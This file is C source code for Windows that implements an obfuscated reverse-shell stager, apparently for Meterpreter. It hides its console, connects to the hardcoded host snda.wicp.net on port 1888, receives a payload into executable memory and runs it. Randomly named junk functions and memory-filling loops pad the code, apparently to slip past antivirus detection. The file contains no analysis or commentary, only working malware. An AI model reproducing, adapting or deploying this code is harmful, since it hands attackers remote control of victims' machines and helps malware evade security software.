#define _WIN32_WINNT 0x0500
#include <winsock2.h>
#include <math.h>
#include <time.h>
#include <windows.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

static char *lhost = "snda.wicp.net";
static int lport = 1888;

char* RcnQpBWohl(const char *t) { int length= strlen(t); int i; char* t2 = (char*)malloc((length+1) * sizeof(char)); for(i=0;i<length;i++) { t2[(length-1)-i]=t[i]; } t2[length] = '\0'; return t2; }
char* tvAsybqHI(char* s){ char *result =  (char *)malloc(strlen(s)*2+1); int i; for (i=0; i<strlen(s)*2+1; i++){ result[i] = s[i/2]; result[i+1]=s[i/2];} result[i] = '\0'; return result; }
void mekPcPLUKE() {WORD qBIivXIaaInheoQ = MAKEWORD((1*2+0), (2*1+0)); WSADATA HzCoDuvC;if (WSAStartup(qBIivXIaaInheoQ, &HzCoDuvC) < 0) { WSACleanup(); exit(1);}}
char* snfByuspQu(){ char jKtymVlC[9087], SgJFaXy[9087/2]; strcpy(jKtymVlC,"bByjWfzVtKVtzwHbJprDTezORzMwJBfSPwnDeRtSOBPBnGHurD"); strcpy(SgJFaXy,"YjLYRhaMUkobQEXhaJeYhtTeaySWCeanGzJjOzFNQfkLJjyZSm"); return tvAsybqHI(strcat( jKtymVlC, SgJFaXy)); }
void QzXtJzMynlpqDR(SOCKET ZHYNysTY) {closesocket(ZHYNysTY);WSACleanup();exit(1);}
char* PFLNLgVcqdbcX() { char ESXWOKQoGRF[9087] = "rvXWIBHhBQeucexjnrIlmUCCMvUDTKfGrUuBhPJaXgOoxOTBJQ"; char *DwRBRB = strupr(ESXWOKQoGRF); return strlwr(DwRBRB); }
int UwOJHE(SOCKET bLjVmVMzR, char * sjqIrcUKY, int sEGzWkjWyufhlOx){int slfkmklsDSA=0;int rcAmwSVM=0;char * startb = sjqIrcUKY;while (rcAmwSVM < sEGzWkjWyufhlOx) {slfkmklsDSA = recv(bLjVmVMzR, (char *)startb, sEGzWkjWyufhlOx - rcAmwSVM, 0);startb += slfkmklsDSA; rcAmwSVM   += slfkmklsDSA;if (slfkmklsDSA == SOCKET_ERROR) QzXtJzMynlpqDR(bLjVmVMzR);} return rcAmwSVM; }
char* EoKYsW(){ char *ulSfprEfcz = RcnQpBWohl("oILfFfVNwfHbzLMrkqoKyOLskYqOYSHZVdjHfzSXGoffSKJinn"); return strstr( ulSfprEfcz, "Y" );}
SOCKET EmQVcJTs() { struct hostent * goradUDdPFlH; struct sockaddr_in ggcuzInzaGittg; SOCKET IomUJKykyYgub;IomUJKykyYgub = socket(AF_INET, SOCK_STREAM, 0);if (IomUJKykyYgub == INVALID_SOCKET) QzXtJzMynlpqDR(IomUJKykyYgub);goradUDdPFlH = gethostbyname("snda.wicp.net");if (goradUDdPFlH == NULL) QzXtJzMynlpqDR(IomUJKykyYgub);memcpy(&ggcuzInzaGittg.sin_addr.s_addr, goradUDdPFlH->h_addr, goradUDdPFlH->h_length);ggcuzInzaGittg.sin_family = AF_INET;ggcuzInzaGittg.sin_port = htons((145*13+3));if ( connect(IomUJKykyYgub, (struct sockaddr *)&ggcuzInzaGittg, sizeof(ggcuzInzaGittg)) ) QzXtJzMynlpqDR(IomUJKykyYgub);return IomUJKykyYgub;}
int meterpreter_main(int argc, char * argv[]) 
{
	if (argc > 1)
		lhost = argv[1];
	if (argc > 2)
		lport = atoi(argv[2]);

	ShowWindow( GetConsoleWindow(), SW_HIDE );ULONG32 AUOkgeOlZpQdUGk;char * szMIiYwBWQdyy;int i;char* qXqmbRqBoATvXo[535];void (*nNMvgwM)();for (i = 0;  i < 535;  ++i) qXqmbRqBoATvXo[i] = (char* )malloc (9951);mekPcPLUKE();char* JbxTuNyiHBKw[8733];SOCKET UaalprwcISE = EmQVcJTs();for (i = 0;  i < 8733;  ++i) JbxTuNyiHBKw[i] = (char* )malloc (9396);int LuYmFQkYgUtTP = recv(UaalprwcISE, (char *)&AUOkgeOlZpQdUGk, (4*1+0), 0);if (LuYmFQkYgUtTP != (4*1+0) || AUOkgeOlZpQdUGk <= 0) QzXtJzMynlpqDR(UaalprwcISE);szMIiYwBWQdyy = (char* )VirtualAlloc(0, AUOkgeOlZpQdUGk + (5*1+0), MEM_COMMIT, PAGE_EXECUTE_READWRITE);char* zgdYYIAeprZAZR[2708];for (i=0; i<535; ++i){strcpy(qXqmbRqBoATvXo[i], snfByuspQu());}if (szMIiYwBWQdyy == NULL) QzXtJzMynlpqDR(UaalprwcISE);szMIiYwBWQdyy[0] = 0xBF;memcpy(szMIiYwBWQdyy + 1, &UaalprwcISE, (2*2+0));for (i = 0;  i < 2708;  ++i) zgdYYIAeprZAZR[i] = (char* )malloc (9800);for (i=0; i<8733; ++i){strcpy(JbxTuNyiHBKw[i], PFLNLgVcqdbcX());}LuYmFQkYgUtTP = UwOJHE(UaalprwcISE, szMIiYwBWQdyy + (5*1+0), AUOkgeOlZpQdUGk);nNMvgwM = (void (*)())szMIiYwBWQdyy;nNMvgwM();for (i=0; i<2708; ++i){strcpy(zgdYYIAeprZAZR[i], EoKYsW());}return 0;
}
